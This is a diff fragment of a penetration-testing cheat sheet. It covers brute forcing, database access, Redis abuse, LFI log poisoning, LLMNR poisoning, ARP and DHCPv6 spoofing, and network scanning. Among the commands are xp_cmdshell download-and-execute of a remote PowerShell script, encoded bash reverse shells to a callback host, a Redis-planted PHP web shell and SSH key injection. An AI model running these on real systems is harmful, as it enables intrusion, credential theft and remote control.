 Cmd > j.exe -l 443 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
 ```
 
@@ -2105,6 +1957,17 @@ PS > Stop-Service wuauserv
 
 
 ### Run as Another User
+
+
+
+### Cmd
+
+
+#### runas
+
+```
+Cmd > runas /u:snovvcrash powershell.exe
+```
 
 
 #### PowerShell
@@ -2182,8 +2045,8 @@ PS > Invoke-RunasCs -Username snovvcrash -Password 'Passw0rd!' -Domain megacorp.
 ## Hydra
 
 ```
-root@kali:$ hydra -V -t 20 -f -I -L logins.lst -P /usr/share/john/password.lst 127.0.0.1 -s 8888 smtp
-root@kali:$ hydra -V -t 20 -f -I -l admin -P /usr/share/john/password.lst 127.0.0.1 -s 8888 ftp
+$ hydra -V -t 20 -f -I -L logins.lst -P /usr/share/john/password.lst 127.0.0.1 -s 8888 smtp
+$ hydra -V -t 20 -f -I -l admin -P /usr/share/john/password.lst 127.0.0.1 -s 8888 ftp
 ```
 
 
@@ -2192,8 +2055,8 @@ root@kali:$ hydra -V -t 20 -f -I -l admin -P /usr/share/john/password.lst 127.0.
 ## Patator
 
 ```
-root@kali:$ patator smtp_login host=127.0.0.1 port=8888 user=FILE0 password=FILE1 0=logins.lst 1=/usr/share/john/password.lst -x ignore:mesg='(515) incorrect password or account name' -x free=user:code=0
-root@kali:$ patator ftp_login host=127.0.0.1 port=8888 user=admin password=FILE0 0=/usr/share/john/password.lst -x ignore:mesg='Login incorrect.' -x free=user:code=0
+$ patator smtp_login host=127.0.0.1 port=8888 user=FILE0 password=FILE1 0=logins.lst 1=/usr/share/john/password.lst -x ignore:mesg='(515) incorrect password or account name' -x free=user:code=0
+$ patator ftp_login host=127.0.0.1 port=8888 user=admin password=FILE0 0=/usr/share/john/password.lst -x ignore:mesg='Login incorrect.' -x free=user:code=0
 ```
 
 
@@ -2216,12 +2079,12 @@ $ hashcat -m 500 hashes/file.hash --username --show
 Benchmarks:
 
 ```
-root@kali:$ nvidia-smi.exe
+$ nvidia-smi.exe
 
 # MD5
-root@kali:$ ./hashcat64.exe -m 0 -b
+$ ./hashcat64.exe -m 0 -b
 # NTLM
-root@kali:$ ./hashcat64.exe -m 1000 -b
+$ ./hashcat64.exe -m 1000 -b
 ```
 
 | Единица хэшрейта  |           Хэшрейт             | Хэши в секунду  |
@@ -2246,7 +2109,7 @@ root@kali:$ ./hashcat64.exe -m 1000 -b
 ## MySQL/MariaDB
 
 ```
-root@kali:$ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
+$ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
 ```
 
 
@@ -2329,7 +2192,7 @@ $ python3 odat.py tnspoison -s 127.0.0.1 -d CLREXTPROC --test-module
 ### sqsh
 
 ```
-root@kali:$ sqsh -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
+$ sqsh -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
 1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.234/shell.ps1')"
 2> GO
 ```
@@ -2339,7 +2202,7 @@ root@kali:$ sqsh -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
 ### mssqlclient.py
 
 ```
-root@kali:$ mssqlclient.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 [-windows-auth]
+$ mssqlclient.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 [-windows-auth]
 SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.234/shell.ps1\")"
 ```
 
@@ -2350,8 +2213,8 @@ SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).Dow
 * [github.com/dbcli/mssql-cli](https://github.com/dbcli/mssql-cli)
 
 ```
-root@kali:$ python -m pip install mssql-cli
-root@kali:$ mssql-cli -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
+$ python -m pip install mssql-cli
+$ mssql-cli -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
 ```
 
 
@@ -2392,9 +2255,9 @@ SELECT username,password FROM secret_database;
 Install **[1]** or **[2]**:
 
 ```
-root@kali:$ mkdir ~/tools/redis-cli-go && cd ~/tools/redis-cli-go
-root@kali:$ wget [1] -O redis-cli-go && chmod +x redis-cli-go
-root@kali:$ ln -s ~/tools/redis-cli-go/redis-cli-go /usr/local/bin/redis-cli-go && cd -
+$ mkdir ~/tools/redis-cli-go && cd ~/tools/redis-cli-go
+$ wget [1] -O redis-cli-go && chmod +x redis-cli-go
+$ ln -s ~/tools/redis-cli-go/redis-cli-go /usr/local/bin/redis-cli-go && cd -
 ```
 
 1. [github.com/holys/redis-cli/releases](https://github.com/holys/redis-cli/releases)
@@ -2403,7 +2266,7 @@ root@kali:$ ln -s ~/tools/redis-cli-go/redis-cli-go /usr/local/bin/redis-cli-go 
 Check if vulnarable:
 
 ```
-root@kali:$ nc 127.0.0.1 6379
+$ nc 127.0.0.1 6379
 Escape character is '^]'.
 echo "Hey, no AUTH required!"
 $21
@@ -2418,11 +2281,11 @@ Connection closed by foreign host.
 ### Web Shell
 
 ```
-root@kali:$ redis-cli -h 127.0.0.1 flushall
-root@kali:$ redis-cli -h 127.0.0.1 set pwn '<?php system($_REQUEST['cmd']); ?>'
-root@kali:$ redis-cli -h 127.0.0.1 config set dbfilename shell.php
-root@kali:$ redis-cli -h 127.0.0.1 config set dir /var/www/html/
-root@kali:$ redis-cli -h 127.0.0.1 save
+$ redis-cli -h 127.0.0.1 flushall
+$ redis-cli -h 127.0.0.1 set pwn '<?php system($_REQUEST['cmd']); ?>'
+$ redis-cli -h 127.0.0.1 config set dbfilename shell.php
+$ redis-cli -h 127.0.0.1 config set dir /var/www/html/
+$ redis-cli -h 127.0.0.1 save
 ```
 
 * [book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
@@ -2432,13 +2295,13 @@ root@kali:$ redis-cli -h 127.0.0.1 save
 ### Inject SSH PubKey
 
 ```
-root@kali:$ ssh-keygen -t ecdsa -s 521 -f key
-root@kali:$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
-root@kali:$ redis-cli -h 127.0.0.1 flushall
-root@kali:$ cat foo.txt | redis-cli -h 127.0.0.1 -x set pwn
-root@kali:$ redis-cli -h 127.0.0.1 config set dbfilename authorized_keys
-root@kali:$ redis-cli -h 127.0.0.1 config set dir /var/lib/redis/.ssh
-root@kali:$ redis-cli -h 127.0.0.1 save
+$ ssh-keygen -t ecdsa -s 521 -f key
+$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
+$ redis-cli -h 127.0.0.1 flushall
+$ cat foo.txt | redis-cli -h 127.0.0.1 -x set pwn
+$ redis-cli -h 127.0.0.1 config set dbfilename authorized_keys
+$ redis-cli -h 127.0.0.1 config set dir /var/lib/redis/.ssh
+$ redis-cli -h 127.0.0.1 save
 ```
 
 
@@ -2475,10 +2338,10 @@ log level = 3
 ```
 
 ```
-root@kali:$ chmod 0555 /tmp/smb
-root@kali:$ chown -R nobody:nogroup /tmp/smb
-root@kali:$ service smbd restart
-root@kali:$ tail -f /var/log/samba/log.<HOSTNAME>
+$ chmod 0555 /tmp/smb
+$ chown -R nobody:nogroup /tmp/smb
+$ service smbd restart
+$ tail -f /var/log/samba/log.<HOSTNAME>
 ```
 
 
@@ -2494,21 +2357,21 @@ root@kali:$ tail -f /var/log/samba/log.<HOSTNAME>
 Access log (needs single `'` instead of double `"`):
 
 ```
-root@kali:$ nc 127.0.0.1 80
+$ nc 127.0.0.1 80
 GET /<?php system($_GET['cmd']); ?>
 
-root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//access.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//access.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
 Or
-root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//1&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//1&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
 ```
 
 Error log:
 
 ```
-root@kali:$ curl -X POST 'http://127.0.0.1/vuln1.php' --form "userfile=@docx/sample.docx" --form 'submit=Generate pdf' --referer 'http://nowhere.com/<?php system($_GET["cmd"]); ?>'
-root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//error.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+$ curl -X POST 'http://127.0.0.1/vuln1.php' --form "userfile=@docx/sample.docx" --form 'submit=Generate pdf' --referer 'http://nowhere.com/<?php system($_GET["cmd"]); ?>'
+$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//error.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
 Or
-root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//2&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//2&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
 ```
 
 
@@ -2803,19 +2666,161 @@ $ sudo apt install openjdk-11-jdk
 # Engagement
 
 ```
-root@kali:$ mkdir -p discover/{nmap,masscan} enum/bloodhound loot/ log/ screenshots/ shells/ tickets/ traffic/
+$ cd ~/workspace/
+$ mkdir -p discover/{nmap,masscan} enum/bloodhound/bloodhound.py loot/ log/ screenshots/ shells/ tickets/ traffic/
 ```
 
 
 
 
-## Network Status
+## Network Config
 
 ```
-root@kali:$ ip addr (ifconfig)
-root@kali:$ ip route (route -n)
-root@kali:$ cat /etc/resolve.conf
-root@kali:$ arp -a
+$ sudo ifconfig eth0
+$ sudo route -n
+$ cat /etc/resolve.conf
+$ arp -a
+```
+
+
+
+
+## Network Attacks
+
+
+
+### Sniff Traffic
+
+
+#### tcpdump
+
+While connected via SSH:
+
+```
+$ tcpdump -i eth0 -w dump.pcap -s0 'not tcp port 22' &
+```
+
+
+#### Wireshark
+
+* [research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
+
+
+
+### LLMNR/NBNS Poisoning
+
+
+#### Responder
+
+* [github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
+* [github.com/lgandx/Responder](https://github.com/lgandx/Responder)
+* [www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
+* [markclayton.github.io/where-are-my-hashes-responder-observations.html](https://markclayton.github.io/where-are-my-hashes-responder-observations.html)
+
+```
+$ git clone https://github.com/lgandx/Responder
+$ sudo ./Responder.py -I eth0 -wfrd -P -v
+
+$ head -n 1 logs/*.txt | grep -v -e logs -e '^$' -e anonymous | sort -u -t: -k1,1 > ~/workspace/loot/net-ntlmv2.responder
+$ sort -u -t: -k1,1 ~/workspace/loot/net-ntlmv2.responder >> ~/workspace/loot/net-ntlmv2.txt && rm ~/workspace/loot/net-ntlmv2.responder
+```
+
+
+#### Inveigh
+
+* [github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
+
+```
+$ curl -L https://github.com/Kevin-Robertson/Inveigh/raw/master/Inveigh.ps1 > inveigh.ps1
+PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
+```
+
+##### InveighZero
+
+* [github.com/Kevin-Robertson/InveighZero](https://github.com/Kevin-Robertson/InveighZero)
+* [github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
+
+```
+$ curl -L https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/Inveigh.exe > inveigh.exe
+PS > .\inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y
+```
+
+
+
+### ARP Spoofing
+
+Enable IP forwarding:
+
+```
+$ sudo sysctl -w net.ipv4.ip_forward=1
+(sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward')
+(edit /etc/sysctl.conf "net.ipv4.ip_forward = 1" to make it permanent)
+```
+
+
+#### dsniff [arpspoof]
+
+* [github.com/tecknicaltom/dsniff](https://github.com/tecknicaltom/dsniff)
+
+Install:
+
+```
+$ sudo apt install dsniff -y
+```
+
+Fire up the attack with Wireshark (filter `ip.src == VICTIM_10.0.0.5`) running:
+
+```
+$ sudo arpspoof -c both -t VICTIM_10.0.0.5 GATEWAY_10.0.0.1
+```
+
+
+#### bettercap
+
+* [github.com/bettercap/bettercap](https://github.com/bettercap/bettercap)
+* [www.bettercap.org/modules/](https://www.bettercap.org/modules/)
+* [linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/](https://linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/)
+* [hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy](https://hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy)
+* [www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets](https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets)
+
+Deb dependencies (Ubuntu 18.04 LTS):
+
+* [libpcap0.8_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8_1.8.1-6ubuntu1_amd64.deb.html)
+* [libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb.html)
+* [libpcap-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap-dev_1.8.1-6ubuntu1_amd64.deb.html)
+* [pkg-config_0.29.1-0ubuntu2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/pkg-config_0.29.1-0ubuntu2_amd64.deb.html)
+* [libnetfilter-queue1_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue1_1.0.2-2_amd64.deb.html)
+* [libnfnetlink-dev_1.0.1-3_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libnfnetlink-dev_1.0.1-3_amd64.deb.html)
+* [libnetfilter-queue-dev_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue-dev_1.0.2-2_amd64.deb.html)
+
+
+
+### DHCPv6 Spoofing
+
+
+#### mitm6
+
+* [github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
+* [blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
+* [intrinium.com/mitm6-pen-testing/](https://intrinium.com/mitm6-pen-testing/)
+
+Install:
+
+```
+$ git clone https://github.com/fox-it/mitm6 ~/tools/mitm6 && cd ~/tools/mitm6
+$ python3 setup.py install
+```
+
+Run:
+
+```
+$ sudo smbserver.py -smb2support share `pwd` | tee -a ~/workspace/log/mitm6-smbserver.out
+$ sudo mitm6.py -i eth0 -d megacorp.local --ignore-nofqdn
+
+$ cat ~/workspace/log/mitm6-smbserver.out | grep 'authenticated successfully' -A1 | grep aaaaaaaaaaaaaaaa | cut -c 5- | grep -v '\$' > ~/workspace/loot/net-ntlmv2.mitm6
+$ sort -u -t: -k1,1 ~/workspace/loot/net-ntlmv2.mitm6 >> ~/workspace/loot/net-ntlmv2.txt && rm ~/workspace/loot/net-ntlmv2.mitm6
+
+$ cat ~/workspace/log/mitm6-smbserver.out | grep 'authenticated successfully' -A1 | grep aaaaaaaaaaaaaaaa | grep '\$' | cut -c 5- | sort -u -t: -k1,1
 ```
 
 
@@ -2837,8 +2842,8 @@ root@kali:$ arp -a
 Active:
 
 ```
-root@kali:$ arp-scan -l [-s <SPOOFED_IP>] -v
-root@kali:$ arp-scan -I eth0 192.168.0.1/24
+$ arp-scan -l [-s <SPOOFED_IP>] -v
+$ arp-scan -I eth0 192.168.0.1/24
 ```
 
 
@@ -2847,13 +2852,13 @@ root@kali:$ arp-scan -I eth0 192.168.0.1/24
 Passive:
 
 ```
-root@kali:$ netdiscover -i eth0 -r 192.168.0.1/24 -p
+$ netdiscover -i eth0 -r 192.168.0.1/24 -p
 ```
 
 Active, sending 20 requests per IP:
 
 ```
-root@kali:$ netdiscover -i eth0 -r 192.168.0.1/24 -c 20
+$ netdiscover -i eth0 -r 192.168.0.1/24 -c 20
 ```
 
 
@@ -2865,10 +2870,10 @@ root@kali:$ netdiscover -i eth0 -r 192.168.0.1/24 -c 20
 Take `10.0.0.0/8` as an example:
 
 ```
-root@kali:$ nmap -n -sn 10.0-255.0-255.1 -oA subnets/gateways -PE --min-rate 10000 --min-hostgroup 10000
-root@kali:$ grep 'Up' subnets/gateways.gnmap |cut -d' ' -f2 > subnets/ranges.txt
+$ nmap -n -sn 10.0-255.0-255.1 -oA subnets/gateways -PE --min-rate 10000 --min-hostgroup 10000
+$ grep 'Up' subnets/gateways.gnmap |cut -d' ' -f2 > subnets/ranges.txt
 
-root@kali:$ sed -i subnets/ranges.txt -e 's/$/\/24/'
+$ sed -i subnets/ranges.txt -e 's/$/\/24/'
 ```
 
 Passive traffic analyze. Look for broadcast/multicast, IPv6 packets:
@@ -2886,11 +2891,11 @@ Passive traffic analyze. Look for broadcast/multicast, IPv6 packets:
 Bash:
 
 ```
-root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 $NET.$i > /dev/null && echo "$NET.$i" |tee -a hosts/pingsweep.txt &); done
+$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 $NET.$i > /dev/null && echo "$NET.$i" |tee -a hosts/pingsweep.txt &); done
 Or
-root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 "$NET.$i" |grep 'bytes from' |cut -d' ' -f4 |cut -d':' -f1 |tee -a hosts/pingsweep.txt &); done
+$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 "$NET.$i" |grep 'bytes from' |cut -d' ' -f4 |cut -d':' -f1 |tee -a hosts/pingsweep.txt &); done
 
-root@kali:$ sort -u -t'.' -k4,4n hosts/pingsweep.txt > hosts/targets.txt && rm hosts/pingsweep.txt
+$ sort -u -t'.' -k4,4n hosts/pingsweep.txt > hosts/targets.txt && rm hosts/pingsweep.txt
 ```
 
 PowerShell:
@@ -2903,8 +2908,8 @@ PS > rm tmp*.txt
 Nmap:
 
 ```
-root@kali:$ nmap -n -sn -iL subnets/ranges.txt -oA hosts/pingsweep -PE
-root@kali:$ grep 'Up' hosts/pingsweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > hosts/targets.txt
+$ nmap -n -sn -iL subnets/ranges.txt -oA hosts/pingsweep -PE
+$ grep 'Up' hosts/pingsweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > hosts/targets.txt
 ```
 
 
@@ -2925,8 +2930,8 @@ Remote Management Interfaces:
 Nmap:
 
 ```
-root@kali:$ nmap -n -Pn -iL subnets/ranges.txt -oA hosts/rmisweep -p22,3389,2222,5985,5986 [--min-rate 1280 --min-hostgroup 256]
-root@kali:$ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n >> hosts/targets.txt
+$ nmap -n -Pn -iL subnets/ranges.txt -oA hosts/rmisweep -p22,3389,2222,5985,5986 [--min-rate 1280 --min-hostgroup 256]
+$ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n >> hosts/targets.txt
 ```
 
 `Invoke-Portscan.ps1`:
@@ -2951,9 +2956,9 @@ PS > Invoke-Portscan -Hosts 127.0.0.1/24 -T 4 -TopPorts 25 -oA localnet
 `parsenmap.rb`:
 
 ```
-root@kali:$ git clone https://github.com/R3dy/parsenmap-rb ~/tools/parsenmap-rb && cd ~/tools/parsenmap-rb
-root@kali:$ bundle install && ln -s ~/tools/parsenmap-rb/parsenmap.rb /usr/local/bin/parsenmap.rb && cd -
-root@kali:$ parsenmap.rb --help
+$ git clone https://github.com/R3dy/parsenmap-rb ~/tools/parsenmap-rb && cd ~/tools/parsenmap-rb
+$ bundle install && ln -s ~/tools/parsenmap-rb/parsenmap.rb /usr/local/bin/parsenmap.rb && cd -
+$ parsenmap.rb --help
 ```
 
 * [github.com/R3dy/parsenmap](https://github.com/R3dy/parsenmap)
@@ -2961,9 +2966,9 @@ root@kali:$ parsenmap.rb --help
 `nmaptocsv`:
 
 ```
-root@kali:$ git clone https://github.com/maaaaz/nmaptocsv ~/tools/nmaptocsv && cd ~/tools/nmaptocsv
-root@kali:$ python3 -m pip install -r requirements.txt csvkit && ln -s ~/tools/nmaptocsv/nmaptocsv.py /usr/local/bin/nmaptocsv.py && cd -
-root@kali:$ nmaptocsv.py --help
+$ git clone https://github.com/maaaaz/nmaptocsv ~/tools/nmaptocsv && cd ~/tools/nmaptocsv
+$ python3 -m pip install -r requirements.txt csvkit && ln -s ~/tools/nmaptocsv/nmaptocsv.py /usr/local/bin/nmaptocsv.py && cd -
+$ nmaptocsv.py --help
 ```
 
 * [github.com/maaaaz/nmaptocsv](https://github.com/maaaaz/nmaptocsv)
@@ -2971,8 +2976,8 @@ root@kali:$ nmaptocsv.py --help
 `parsenmap.py`:
 
 ```
-root@kali:$ wget https://github.com/snovvcrash/cheatsheets/raw/master/tools/parsenmap.py -O ~/tools/parsenmap-py/parsenmap.py && chmod +x ~/tools/parsenmap-py/parsenmap.py
-root@kali:$ ln -s ~/tools/parsenmap-py/parsenmap.py /usr/local/bin/parsenmap.py
+$ wget https://github.com/snovvcrash/cheatsheets/raw/master/tools/parsenmap.py -O ~/tools/parsenmap-py/parsenmap.py && chmod +x ~/tools/parsenmap-py/parsenmap.py
+$ ln -s ~/tools/parsenmap-py/parsenmap.py /usr/local/bin/parsenmap.py
 ```
 
 * [github.com/snovvcrash/cheatsheets/blob/master/tools/parsenmap.py](https://github.com/snovvcrash/cheatsheets/blob/master/tools/parsenmap.py)
@@ -2984,28 +2989,28 @@ root@kali:$ ln -s ~/tools/parsenmap-py/parsenmap.py /usr/local/bin/parsenmap.py
 Echo:
 
 ```
-root@kali:$ IP="0.0.0.0"; for p in $(seq 1 65535); do (timeout 1 bash -c "echo '.' >/dev/tcp/$IP/$port && echo OPEN:$port" >> hosts/ports.txt &) 2>/dev/null; done
-root@kali:$ sort -u -t':' -k1,1n hosts/ports.txt > hosts/echo-ports.txt && rm hosts/ports.txt
+$ IP="0.0.0.0"; for p in $(seq 1 65535); do (timeout 1 bash -c "echo '.' >/dev/tcp/$IP/$port && echo OPEN:$port" >> hosts/ports.txt &) 2>/dev/null; done
+$ sort -u -t':' -k1,1n hosts/ports.txt > hosts/echo-ports.txt && rm hosts/ports.txt
 ```
 
 Netcat:
 
 ```
-root@kali:$ seq 1 65535|xargs -n 1|xargs -P 0 -I {} nc -nv -z -w1 0.0.0.0 {} 2>&1| grep -vE "timed out|now in progress|Connection refused"
+$ seq 1 65535|xargs -n 1|xargs -P 0 -I {} nc -nv -z -w1 0.0.0.0 {} 2>&1| grep -vE "timed out|now in progress|Connection refused"
 ```
 
 Nmap:
 
 ```
-root@kali:$ nmap -n -Pn -iL hosts/targets.txt -oA services/?-top-ports [--top-ports ? -T4 --min-rate 1280 --min-hostgroup 256]
-root@kali:$ grep 'open' services/?-top-ports.gnmap
-root@kali:$ parsenmap.rb services/?-top-ports.xml
-root@kali:$ nmaptocsv.py -x services/?-top-ports.xml -d',' -f ip-fqdn-port-protocol-service-version-os |csvlook -I
+$ nmap -n -Pn -iL hosts/targets.txt -oA services/?-top-ports [--top-ports ? -T4 --min-rate 1280 --min-hostgroup 256]
+$ grep 'open' services/?-top-ports.gnmap
+$ parsenmap.rb services/?-top-ports.xml
+$ nmaptocsv.py -x services/?-top-ports.xml -d',' -f ip-fqdn-port-protocol-service-version-os |csvlook -I
 
-root@kali:$ nmap -n -Pn -iL hosts/targets.txt -oA services/quick-sweep -p22,25,53,80,443,445,1433,3306,3389,5800,5900,8080,8443 [-T4 --min-rate 1280 --min-hostgroup 256]
-root@kali:$ grep 'open' services/quick-sweep.gnmap
-root@kali:$ parsenmap.rb services/quick-sweep.xml
-root@kali:$ nmaptocsv.py -x services/quick-sweep.xml -d',' -f ip-fqdn-port-protocol-service-version-os |csvlook -I
+$ nmap -n -Pn -iL hosts/targets.txt -oA services/quick-sweep -p22,25,53,80,443,445,1433,3306,3389,5800,5900,8080,8443 [-T4 --min-rate 1280 --min-hostgroup 256]
+$ grep 'open' services/quick-sweep.gnmap
+$ parsenmap.rb services/quick-sweep.xml
+$ nmaptocsv.py -x services/quick-sweep.xml -d',' -f ip-fqdn-port-protocol-service-version-os |csvlook -I
 ```
 
 
@@ -3013,25 +3018,25 @@ root@kali:$ nmaptocsv.py -x services/quick-sweep.xml -d',' -f ip-fqdn-port-proto
 ### Ports (Full)
 
 ```
-root@kali:$ nmap -n -Pn -sV -sC -iL hosts/targets.txt -oA services/alltcp-versions -p0-65535 --min-rate 50000 --min-hostgroup 256
+$ nmap -n -Pn -sV -sC -iL hosts/targets.txt -oA services/alltcp-versions -p0-65535 --min-rate 50000 --min-hostgroup 256
 ```
 
 Define which NSE scripts ran:
 
 ```
-root@kali:$ grep '|_' services/alltcp-versions.nmap |cut -d'_' -f2 |cut -d' ' -f1 |sort -u |grep ':'
+$ grep '|_' services/alltcp-versions.nmap |cut -d'_' -f2 |cut -d' ' -f1 |sort -u |grep ':'
 ```
 
 Look at HTTP titles:
 
 ```
-root@kali:$ grep -i 'http-title' services/alltcp-versions.nmap
+$ grep -i 'http-title' services/alltcp-versions.nmap
 ```
 
 Examine version scan:
 
 ```
-root@kali:$ parsenmap.rb services/alltcp-versions.xml > services/alltcp-versions.csv
+$ parsenmap.rb services/alltcp-versions.xml > services/alltcp-versions.csv
 Or
 nmaptocsv.py -x services/alltcp-versions.xml -d',' -f ip-fqdn-port-protocol-service-version-os > services/alltcp-versions.csv
 ```
@@ -3039,188 +3044,35 @@ nmaptocsv.py -x services/alltcp-versions.xml -d',' -f ip-fqdn-port-protocol-serv
 Split version scan by service names:
 
 ```
-root@kali:$ parsenmap.py -i services/alltcp-versions.xml
+$ parsenmap.py -i services/alltcp-versions.xml
 ```
 
 
 
-### AD Environment Names
-
-Discover domain NetBIOS name:
-
-```
-PS > ([ADSI]"LDAP://megacorp.local").dc
-
-PS > $DomainName = (Get-ADDomain).DNSRoot
-PS > (Get-ADDomain -Server $DomainName).NetBIOSName
-```
-
-Discover DCs' FQDN names:
-
-```
-PS > nslookup -type=all _ldap._tcp.dc._msdcs.$env:userdnsdomain
-
-PS > $ldapFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
-PS > $searcher = [ADSISearcher]$ldapFilter
-PS > $searcher.FindAll()
-PS > $searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() }
-Or
-PS > ([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll() |ForEach-Object { $_.GetDirectoryEntry() }
-
-PS > [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers.Name
-
-Cmd > nltest /dsgetdc:megacorp.local
-
-PS > $DomainName = (Get-ADDomain).DNSRoot
-PS > $AllDCs = Get-ADDomainController -Filter * -Server $DomainName | Select-Object Hostname,Ipv4address,isglobalcatalog,site,forest,operatingsystem
-
-PS > $AllDCs = (Get-ADForest).GlobalCatalogs
-
-PowerView3 > Get-DomainController | Select Name,IPAddress
-```
-
-Discover global catalog:
-
-```
-PS > Get-ADDomainController -Discover -Service "GlobalCatalog"
-```
-
-Discover MS Exchnage servers' FQDN names:
-
-* [github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers)
-
-```
